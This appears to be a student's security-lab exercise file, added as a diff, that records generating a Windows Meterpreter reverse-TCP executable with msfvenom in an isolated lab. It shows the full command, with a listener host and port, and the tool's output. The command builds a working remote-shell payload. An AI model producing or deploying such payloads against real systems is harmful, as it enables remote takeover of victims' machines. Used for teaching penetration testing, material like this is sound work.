@@ -1,0 +1,25 @@
+Experiment 20: Payload Generation Using MSFVenom
+=============================================
+
+Note: For educational purposes only, performed in an isolated lab
+environment on systems owned by the student/institution.
+
+Command:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > payload.exe
+
+Sample Output:
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > payload.exe
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+
+┌──(kali㉿kali)-[~]
+└─$ ls -l payload.exe
+-rw-r--r-- 1 kali kali 73802 Nov 25 11:05 payload.exe
+
+Result:
+Successfully generated a test payload (payload.exe) in the lab environment.
